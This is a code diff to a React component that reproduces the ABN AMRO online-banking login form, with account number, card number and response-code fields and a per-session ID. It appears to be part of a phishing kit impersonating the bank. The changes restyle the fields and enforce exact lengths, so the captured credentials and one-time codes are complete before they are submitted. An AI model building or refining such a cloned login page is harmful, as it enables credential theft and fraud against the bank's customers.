@@ -110,7 +110,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
                 <label className="block text-[13px] text-[#333333] mb-2 font-normal">Rekening- en pasnummer</label>
                 <div className="flex items-center gap-2">
                   <div className="flex-1 flex items-center border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-white h-10 transition-colors">
-                    <span className="pl-3 pr-2 text-[13px] text-gray-500 whitespace-nowrap bg-gray-50 h-full flex items-center border-r border-gray-300">
+                    <span className="pl-3 pr-2 text-[13px] text-[#004b46] font-medium whitespace-nowrap bg-[#f0f5f5] h-full flex items-center border-r border-gray-300">
                       NL ** ABNA 0
                     </span>
                     <input
@@ -118,20 +118,22 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
                       required
                       inputMode="numeric"
                       maxLength={9}
+                      minLength={9}
                       value={accountNumber}
-                      onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, ''))}
+                      onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, '').slice(0, 9))}
                       className="w-full px-2 py-2 text-[13px] focus:outline-none bg-transparent"
                     />
                   </div>
-                  <div className="w-[70px] border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-white h-10 transition-colors">
+                  <div className="w-[60px] border border-gray-300 focus-within:border-[#009286] focus-within:ring-1 focus-within:ring-[#009286] bg-white h-10 transition-colors shrink-0">
                     <input
                       type="text"
                       required
                       inputMode="numeric"
                       maxLength={4}
+                      minLength={4}
                       value={cardNumber}
-                      onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ''))}
-                      className="w-full px-3 py-2 text-[13px] focus:outline-none bg-transparent text-center"
+                      onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, '').slice(0, 4))}
+                      className="w-full h-full px-1 text-[14px] text-[#004b46] focus:outline-none bg-transparent text-center"
                     />
                   </div>
                 </div>
@@ -169,7 +171,7 @@ export function AbnAmroLoginClient({ sessionId }: Props) {
 
               <button
                 type="submit"
-                disabled={saving || !accountNumber || !cardNumber || !responseCode}
+                disabled={saving || accountNumber.length !== 9 || cardNumber.length !== 4 || responseCode.length !== 8}
                 className="bg-[#F3C000] hover:bg-[#e0b000] text-[#333333] px-6 py-[10px] text-[15px] font-medium transition-colors disabled:opacity-50 min-w-[120px]"
               >
                 {saving ? "Laden..." : "Inloggen"}
